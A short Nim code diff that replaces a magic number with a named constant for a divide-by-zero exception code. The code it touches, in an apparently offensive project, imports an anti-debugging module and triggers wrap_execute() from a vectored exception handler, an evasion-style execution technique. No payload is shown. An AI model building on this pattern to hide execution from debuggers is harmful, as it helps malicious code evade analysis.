@@ -3,6 +3,7 @@ import params
 import antidebug
 include helpers
 
+const STATUS_INTEGER_DIVIDE_BY_ZERO = 0xC0000094
 
 # Raising VEH
 {.emit: """
@@ -129,7 +130,7 @@ proc wrapExecute() =
 
 
 proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
-    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](0xC0000094)): # STATUS_INTEGER_DIVIDE_BY_ZERO 
+    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](STATUS_INTEGER_DIVIDE_BY_ZERO)): 
         wrap_execute()
     else:
         return EXCEPTION_CONTINUE_SEARCH
